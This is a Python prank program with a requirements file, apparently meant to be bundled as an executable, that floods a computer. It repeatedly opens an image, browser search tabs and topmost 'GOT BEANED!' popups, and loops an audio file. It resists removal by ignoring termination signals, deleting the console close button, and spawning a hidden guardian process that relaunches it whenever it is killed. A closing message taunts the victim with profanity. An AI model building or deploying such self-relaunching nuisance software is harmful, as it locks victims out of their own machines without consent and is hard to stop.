import subprocess
import sys
import time
import webbrowser
import threading
import tkinter as tk
import signal
import ctypes
import os
import psutil

# ─── CONFIGURATION ────────────────────────────────────────────────────────────
SEARCH_QUERY     = "bush's baked beans"                         # what to search
SEARCH_INTERVAL  = 0.9                              # seconds between searches

MP3_DURATION     = 3600                            # how long to loop mp3 in seconds (3600 = 1 hour)

POPUP_INTERVAL   = 0.4                              # seconds between popups
POPUP_TITLE      = "GOT BEANED!"                      # popup window title
POPUP_MESSAGE    = "YOU GOT BEANED!" # popup message
POPUP_DURATION   = 0                               # seconds before auto-close (0 = manual close)

BEAN_SPAM_INTERVAL = 0.5                           # seconds between each bean.png open
# ──────────────────────────────────────────────────────────────────────────────


def get_resource_path(filename):
    """Get the path to a bundled file whether running as script or PyInstaller exe."""
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, filename)
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)

BEAN_PATH = get_resource_path("bean.png")
MP3_PATH  = get_resource_path("laughalot.mp3")


def block_signals():
    for sig in (signal.SIGTERM, signal.SIGINT, signal.SIGABRT):
        try:
            signal.signal(sig, signal.SIG_IGN)
        except (OSError, ValueError):
            pass

def disable_close_button():
    if sys.platform == "win32":
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                hmenu = ctypes.windll.user32.GetSystemMenu(hwnd, False)
                ctypes.windll.user32.DeleteMenu(hmenu, 0xF060, 0x0)
        except Exception:
            pass

def open_with_default(path):
    if sys.platform == "win32":
        subprocess.Popen(["start", path], shell=True)
    elif sys.platform == "darwin":
        subprocess.Popen(["open", path])
    else:
        subprocess.Popen(["xdg-open", path])


# ─── FEATURE 1: Spam open bean.png ────────────────────────────────────────────

def bean_spam_loop():
    print(f"[Bean] Spamming {BEAN_PATH} every {BEAN_SPAM_INTERVAL}s.")
    while True:
        open_with_default(BEAN_PATH)
        time.sleep(BEAN_SPAM_INTERVAL)


# ─── FEATURE 2: Loop laughalot.mp3 for 1 hour ─────────────────────────────────

def get_mp3_process_names():
    if sys.platform == "win32":
        return [
            "wmplayer.exe", "groove.exe", "musicsink.exe",
            "vlc.exe", "winamp.exe", "foobar2000.exe",
            "itunes.exe", "musicbee.exe", "aimp.exe"
        ]
    elif sys.platform == "darwin":
        return ["Music", "QuickTime Player", "VLC"]
    else:
        return ["vlc", "rhythmbox", "banshee", "audacious", "clementine", "mpv"]

def play_mp3_and_guard():
    print(f"[MP3] Playing {MP3_PATH}, looping for {MP3_DURATION}s.")
    open_with_default(MP3_PATH)
    start_time = time.time()
    time.sleep(3)

    player_names = get_mp3_process_names()

    while True:
        elapsed = time.time() - start_time
        if elapsed >= MP3_DURATION:
            print("[MP3] 1 hour reached, done.")
            break

        running_players = [
            p.name() for p in psutil.process_iter()
            if p.name().lower() in [n.lower() for n in player_names]
        ]

        if not running_players:
            print("[MP3] Player closed, reopening...")
            open_with_default(MP3_PATH)
            time.sleep(3)

        time.sleep(2)


# ─── FEATURE 3: Recurring browser search ──────────────────────────────────────

def browser_search_loop():
    url = f"https://www.google.com/search?q={SEARCH_QUERY.replace(' ', '+')}"
    print(f"[Search] Searching '{SEARCH_QUERY}' every {SEARCH_INTERVAL}s.")
    while True:
        webbrowser.open_new_tab(url)
        time.sleep(SEARCH_INTERVAL)


# ─── FEATURE 4: Recurring popups ──────────────────────────────────────────────

def show_popup():
    win = tk.Tk()
    win.title(POPUP_TITLE)
    win.attributes("-topmost", True)

    win.update_idletasks()
    width, height = 300, 120
    x = (win.winfo_screenwidth() // 2) - (width // 2)
    y = (win.winfo_screenheight() // 2) - (height // 2)
    win.geometry(f"{width}x{height}+{x}+{y}")

    tk.Label(win, text=POPUP_MESSAGE, wraplength=260, pady=20).pack()
    tk.Button(win, text="OK", command=win.destroy).pack()

    if POPUP_DURATION > 0:
        win.after(POPUP_DURATION * 1000, win.destroy)

    win.mainloop()

def popup_loop():
    print(f"[Popup] Popup every {POPUP_INTERVAL}s.")
    while True:
        time.sleep(POPUP_INTERVAL)
        show_popup()


# ─── SELF RELAUNCH ─────────────────────────────────────────────────────────────

def relaunch_if_killed():
    script = os.path.abspath(sys.argv[0])
    guardian_code = f"""
import time, subprocess, sys, os
script = r"{script}"
while True:
    p = subprocess.Popen([sys.executable, script, "--child"])
    p.wait()
    time.sleep(2)
"""
    if "--child" not in sys.argv:
        subprocess.Popen(
            [sys.executable, "-c", guardian_code],
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
        )
        sys.exit()


# ─── MAIN ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    relaunch_if_killed()
    block_signals()
    disable_close_button()

    threading.Thread(target=bean_spam_loop, daemon=True).start()
    threading.Thread(target=play_mp3_and_guard, daemon=True).start()
    threading.Thread(target=browser_search_loop, daemon=True).start()
    threading.Thread(target=popup_loop, daemon=True).start()

    print("[Main] Got beaned. Not even the police can save you now motherfucker.")
    while True:
        time.sleep(1)


requirements.txt

watchdog
psutil
